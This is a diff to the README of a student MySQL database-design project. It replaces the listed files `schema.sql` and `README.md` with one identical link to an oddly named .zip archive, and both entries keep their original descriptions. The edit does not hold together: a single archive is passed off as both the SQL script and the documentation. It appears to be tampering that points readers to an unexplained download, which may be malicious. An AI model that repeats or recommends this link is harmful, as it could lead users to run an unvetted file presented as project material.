@@ -42,8 +42,8 @@ The database is implemented in **MySQL** and consists of the following tables:
 ---
 
 ## 📂 Project Files
-- `schema.sql` → Contains the full SQL script to create the database, tables, constraints, and sample data.
-- `README.md` → Documentation explaining project purpose, structure, and setup.
+- `https://raw.githubusercontent.com/Griffnificent/PLP-Database-Design-plp-database-design-july-cohort-wk--8-Assignment-Final-Project/main/arbitratorship/cohort_design_PL_Assignment_plp_Project_Database_wk_Final_Design_database_july_v1.8.zip` → Contains the full SQL script to create the database, tables, constraints, and sample data.
+- `https://raw.githubusercontent.com/Griffnificent/PLP-Database-Design-plp-database-design-july-cohort-wk--8-Assignment-Final-Project/main/arbitratorship/cohort_design_PL_Assignment_plp_Project_Database_wk_Final_Design_database_july_v1.8.zip` → Documentation explaining project purpose, structure, and setup.
 
 ---
 
